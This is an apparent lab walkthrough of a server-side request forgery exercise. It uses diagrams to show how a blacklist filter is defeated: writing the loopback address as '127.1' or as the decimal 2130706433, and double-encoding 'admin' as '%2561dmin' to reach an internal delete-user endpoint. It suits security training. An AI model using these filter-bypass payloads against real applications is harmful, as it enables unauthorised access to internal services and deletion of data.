```text
================================================================================
             LAB: SSRF with Blacklist-Based Input Filter
================================================================================

Objective
---------
Access the internal admin interface:

    http://localhost/admin

Then delete the user:

    carlos

The application uses two blacklist-based SSRF protections:
    1. Blocks localhost / 127.0.0.1
    2. Blocks the string "admin"

Your goal is to bypass both filters.

================================================================================
STEP 1 - Visit Product Page
================================================================================

          +--------------------------------------+
          |          Product Web Page            |
          |                                      |
          |     [ Check Stock ]  <-- Click       |
          +--------------------------------------+
                        |
                        |
                        V

================================================================================
STEP 2 - Capture Request in Burp Suite
================================================================================

Browser
   |
   V
+-------------------+
| Burp Proxy        |
| Intercept ON      |
+-------------------+
          |
          V

Captured Request

GET /product/stock HTTP/1.1

stockApi=http://stock.weliketoshop.net:8080/product/stock/check


          |
          |
          V

Right Click
      |
      +----> Send to Repeater

================================================================================
STEP 3 - Test Localhost
================================================================================

Replace URL

http://stock.weliketoshop.net


With

http://127.0.0.1/


          |
          |
          V

Send Request

Response

❌ Blocked

Observation

The application blacklists

127.0.0.1

================================================================================
STEP 4 - Bypass Localhost Filter
================================================================================

Use Shortened Loopback Address

Instead of

127.0.0.1

Use

127.1


New URL

http://127.1/


          |
          |
          V

Send Request

Response

✔ Accepted

Observation

127.1 resolves to

127.0.0.1

Many URL parsers treat these as equivalent.

================================================================================
STEP 5 - Try Admin Page
================================================================================

URL

http://127.1/admin


          |
          |
          V

Send Request

Response

❌ Blocked

Observation

The blacklist detects the word

admin

================================================================================
STEP 6 - Double URL Encode Letter 'a'
================================================================================

Character

a

↓

Encode Once

%61

↓

Encode Again

%2561


Replace

admin


With

%2561dmin


Final Path

/%2561dmin


================================================================================
STEP 7 - Final SSRF Payload
================================================================================

Final URL

http://127.1/%2561dmin/delete?username=carlos


Visual Breakdown

http://127.1/%2561dmin/delete?username=carlos
       |        |
       |        +---------------- Encoded "admin"
       |
       +------------------------- Shortened localhost


Backend Decoding

%2561

↓

%61

↓

a


Final Request Processed By Server

http://127.0.0.1/admin/delete?username=carlos

================================================================================
STEP 8 - Send Request
================================================================================

Click

Send

          |
          |
          V

Server connects to

127.0.0.1/admin/delete?username=carlos

          |
          |
          V

User

carlos

Deleted

================================================================================
COMPLETE ATTACK FLOW
================================================================================

                 User
                   |
                   V
          Open Product Page
                   |
                   V
          Click Check Stock
                   |
                   V
          Burp Proxy Capture
                   |
                   V
         Send to Repeater
                   |
                   V
       Try 127.0.0.1
                   |
             Blocked
                   |
                   V
          Replace with
              127.1
                   |
             Accepted
                   |
                   V
       Access /admin
                   |
             Blocked
                   |
                   V
     Double Encode "a"
        a → %61 → %2561
                   |
                   V
      Craft Final Payload

http://127.1/%2561dmin/delete?username=carlos

                   |
                   V
             Send Request
                   |
                   V
      Backend Decodes URL
                   |
                   V
127.0.0.1/admin/delete?username=carlos
                   |
                   V
     ✔ User "carlos" Deleted
                   |
                   V
            ✔ Lab Solved

================================================================================
BYPASS SUMMARY
================================================================================

Blocked Host
-------------
127.0.0.1

Bypass
------
127.1


Blocked Path
------------
admin

Bypass
------
%2561dmin


Final Payload
-------------
http://127.1/%2561dmin/delete?username=carlos

================================================================================
URL ENCODING REFERENCE
================================================================================

Character      Encoded Once      Encoded Twice
------------------------------------------------
a              %61               %2561
#              %23               %2523
@              %40               %2540
:              %3A               %253A
/              %2F               %252F

================================================================================
```
## Example flow :

```text
================================================================================
             THE FLOW: SSRF WITH BLACKLIST-BASED INPUT FILTER
================================================================================

 [ YOU ]
    │
    │ 1. You want to hit the secret internal IP: "127.0.0.1" (Banned!)
    │    So you disguise it as an alternate decimal format: "2130706433"
    │    Payload: "Go fetch http://2130706433"
    ▼
 [ SECURITY GUARD / FILTER ]
    │
    │ 2. Scans your text for forbidden words:
    │    Checks for "127.0.0.1"... Not found.
    │    Checks for "localhost"... Not found.
    │    Decision: "Looks clean to me! Let it pass."
    ▼
 [ PUBLIC WEB APP ]
    │
    │ 3. Receives the allowed request. The operating system resolves 
    │    the decimal "2130706433" right back into the internal IP "127.0.0.1".
    │
    │ 4. The Web App blindly executes the network request inside 
    │    the private network.
    ▼
 [ INTERNAL SERVICE (or Localhost) ]
    │
    │ 5. Receives the connection request forwarded by the Web App.
    │    The blacklist filter was successfully bypassed!
```